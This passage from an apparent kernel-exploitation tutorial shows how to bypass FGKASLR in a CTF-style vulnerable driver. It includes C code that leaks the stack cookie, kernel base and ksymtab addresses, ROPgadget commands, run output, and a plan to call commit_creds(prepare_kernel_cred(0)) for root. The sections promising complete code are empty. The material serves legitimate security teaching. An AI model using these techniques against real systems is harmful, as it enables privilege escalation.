kernel space.

Below we see an excerpt of the first run.
```
ffffffffa7200000 T _text
...
ffffffffa7600dc6 T __x86_retpoline_r15
ffffffffa7600de0 T pm_wakeup_source_sysfs_add
...
```

And here is an excerpt of the second run.
```
ffffffff83e00000 T _text
...
ffffffff84200dc6 T __x86_retpoline_r15
ffffffff84200de0 T agp_bind_memory
...
```

For the section between `_text` and `__x86_retpoline_r15`, we see that
only the three bytes after `ffffffff` are different. The order of the
symbols and also their relative distances are the same. Hence, this is
only affected by KASLR, but not FGKASLR.
The length of this area is `ffffffff84200dc6 - ffffffff83e00000 = 400dc6`.

Later, the order of functions is randomized. This is where FGKASLR is
applied.

What is not shown in the excerpt is that even later, starting from the
symbol `__start_rodata` to the end, again only KASLR is applied.
However, as suggested by the name, this section contains read-only
data and hence cannot be directly used for the construction of ROP
gadgets as it is not executable. However, it contains structs such as
`ksymtab` which can be used to calculate addresses.

As an example both functions `prepare_kernel_cred` and `commit_creds`
are in the section randomized using FGKASLR. Hence, we cannot compute
their offsets, given the kernel base address naively. But within
ksymtab there are the structs `__ksymtab_prepare_kernel_cred` and
`__ksymtab_commit_creds`.
These are defined as follows.
{% highlight C %}
struct kernel_symbol {
	  int value_offset;
	  int name_offset;
	  int namespace_offset;
};
{% endhighlight %}

If we add the `value_offset` to the address of the entry symbol, then
we find the actual symbol. Thus, we can compute the addresses of
`prepare_kernel_cred` and `commit_creds` using an appropriate ROP
chain, even though these symbols reside in the memory area using
FGKASLR.

Further, if we take a look at the ROP gadgets that we used previously,
we see that all of them reside in the KASLR section, except
for `mov_rdi_rax_movrsi_poprbp = 0xffffffff816bf203;` that resides in
the FGKASLR section.

We can filter for gadgets in the _correct_ section using
[ROPGadget](https://github.com/JonathanSalwan/ROPgadget) (`pip install ROPGadget`)
with `ROPgadget --binary ./vmlinux --range
0xffffffff81000000-0xffffffff81400dc6`.
Or using [ropr](https://github.com/ben-lichtman/ropr) (`cargo install
ropr`)
with `ropr --range "0xffffffff81000000-0xffffffff81400dc6" ./vmlinux`

As we know that without KASLR a kernel is loaded at `0xffffffff81000000`, we
can quickly compute the offsets. As an example, in the previous
exploit using a signal for the KPTI bypass, we had the following ROP
gadget.
{% highlight C %}
uint64_t pop_rdi_ret = 0xffffffff8100767c; // pop rdi; ret
{% endhighlight %}
With KASLR, this becomes the following.
{% highlight C %}
uint64_t pop_rdi_ret = kernel_base + 0x0000767cUL; // pop rdi; ret
{% endhighlight %}

### Leaking the Addresses of `prepare_kernel_cred` and `commit_cred`

For our exploit we need the addresses of the functions `prepare_kernel_cred` and `commit_cred`.
Unfortunately for us, both of these symbols are in a section of the kernel that is affected by FGKASLR.
Hence, we cannot compute their addresses in the kernel by adding a fixed offset
to the kernel base.

However, we already saw that there is a section at the end of the kernel
memory containing read-only data whose addresses are randomized using only ASLR and not KASLR.
This section contains the structs `__ksymtab_prepare_kernel_cred` and
`__ksymtab_commit_creds`
whose addresses we could compute.
From these, we can compute the addresses of `prepare_kernel_cred` and `commit_cred`.

So let us start to access `__ksymtab_prepare_kernel_cred` and
`__kstrtab_commit_creds` by adding their offsets to the kernel base address.
For this, we modified the function `leak_cookie()` as follows:

{% highlight C %}
void leak_cookie() {
    uint8_t sz = 40;
    uint64_t leak[sz];
    printf("[*] trying to leak up to %ld bytes memory\n", sizeof(leak));
    uint64_t data = read(global_fd, leak, sizeof(leak));
    cookie = leak[16];
    printf("[+] leaked cookie: 0x%lx\n", cookie);
    uint64_t kernel_base = leak[38] - 0x0a157UL;
    printf("[+] leaked kernel_base 0x%lx\n", kernel_base);
    uint64_t ksymtab_prepare_kernel_cred = kernel_base + 0xf8d4fcUL;
    printf("[+] leaked ksymtab_prepare_kernel_cred 0x%lx\n", ksymtab_prepare_kernel_cred);
    uint64_t ksymtab_commit_creds = kernel_base + 0xf87d90UL;
    printf("[+] leaked ksymtab_commit_creds 0x%lx\n", ksymtab_commit_creds);
{% endhighlight %}

Running this yields the real addresses
of the symbols, as can be shown when contrasting with the true
location within `/proc/kallsyms`.

```
/ # ./leak_cookie
[+] successfully opened /dev/hackme
[*] Saved state
[*] trying to leak up to 320 bytes memory
[+] leaked cookie: 0xaec7370351852800
[+] leaked kernel_base 0xffffffffbd600000
[+] leaked ksymtab_prepare_kernel_cred 0xffffffffbe58d4fc
[+] leaked ksymtab_commit_creds 0xffffffffbe587d90
/ # cat /proc/kallsyms | grep ffffffffbe58d4fc
ffffffffbe58d4fc r __ksymtab_prepare_kernel_cred
/ # cat /proc/kallsyms | grep ffffffffbe587d90
ffffffffbe587d90 r __ksymtab_commit_creds
```

What remains is to compute the location of
`prepare_kernel_cred` from `__ksymtab_prepare_kernel_cred`
and the location of `commit_creds` from
`__kstrtab_commit_creds`.

Remember that the kernel symbols structs are defined as follows:

{% highlight C %}
struct kernel_symbol {
	  int value_offset;
	  int name_offset;
	  int namespace_offset;
};
{% endhighlight %}

Hence, we can now use a ROP gadget to store `ksymtabs_commit_creds - 0x10`
in rax, read the `value_offset`, and hence obtain the memory location
of `commit_creds` by adding the `value_offset` to the location of
`ksymtabs_commit_creds`.

The full code to compute the memory location of `commit_creds` is as follows.

Executing this yields the following.
```
/ # ./leak_commit_creds
[+] successfully opened /dev/hackme
[*] Saved state
[*] trying to leak up to 320 bytes memory
[+] leaked cookie: 0xbde6cd8832184c00
[+] leaked kernel_base 0xffffffffb3000000

[+] leaked ksymtab_commit_creds 0xffffffffb3f87d90
[+] leaked commit_creds 0xb385a200
Segmentation fault
```

This is the true location of the symbol `commit_creds` as we can easily verify.
```
/ # cat /proc/kallsyms | grep b385a200
ffffffffb385a200 T commit_creds
```

The memory location of `prepare_kernel_cred` can be retrieved similarly.

## Game Plan
After showing these building blocks, we can now stitch together the
complete game plan for exploiting the kernel driver with FGKASLR.
We can leak enough values of the stack to get the base address of the
kernel at offset 38.
Then, we can craft a ROP chain with gadgets in the memory area that is
only affected by KASLR, but not by FGKASLR.
This ROP chain reads the kernel symbol table entries in the read-only data
section of kernel memory. The offsets of these entries can again be
computed, as they are at a constant offset of the kernel base address and
are not affected by FGKASLR, but again only by KASLR.
We use these entries to read the address of the functions
`prepare_kernel_cred` and `commit_creds`. Even though these functions
are in the memory area affected by FGKASLR, we can know their
addresses, as they are stored in the kernel symbol table.

Then, we need to execute `prepare_kernel_cred` and `commit_creds` as
before and should be presented with a root shell.

What remains is to circumvent the need for a gadget that moves the
result from `prepare_kernel_cred` to `commit_cred`, i.e., from rax to
rdx.
Previously, we had a gadget for this, but it is in the section
affected by FGKASLR and hence not available anymore.

## Complete Code

We will now present the complete code for the exploit using FGKASLR.

# Conclusion/Summary
That was a long article. Congrats if you made it this far. If you
skipped some parts, or forgot the start of the article, here are the
most important points, that should stick with you.

In general, in kernel space you cannot pop shellcode. You want to
execute `commit_creds(prepare_kernel_cred(0))` and return back to user
space. This gives you an elevated prompt.

If you encounter **SMEP (Supervisor Mode Execution Prevention)** or
**SMAP (Supervisor Mode Access Prevention)**
you cannot use code from user space in kernel exploits. What you need
to do to bypass it, is to write a ROP chain with gadgets in the kernel.

If you encounter **KPTI (Kernel Page Table Isolation)** there are
various bypasses. The most common one is to make use of a KPTI
trampoline. This is the code that syscalls execute when they go back
to user space. You can find the other bypasses above in the article.

Finally, if you encounter **Kernel ASLR (Address Space Layout
Randomization)** you need to check if it is on the granularity of
functions or if the whole kernel is moved by an offset. In the
second case, a single kernel address leak is enough to recover all
addresses. If FGKASLR is used, there are still parts of the kernel
that are only moved by a static offset. Again using a kernel address
leak allows to construct ROP chains using these memory locations

# Resources
There are lots of writeups for exactly this challenge and i have read
multiple of them, as they focus on different aspects. Some code parts
are lifted from these other writeups. Without these writeups my guide
could not have existed. We really stand on the shoulders of giants.
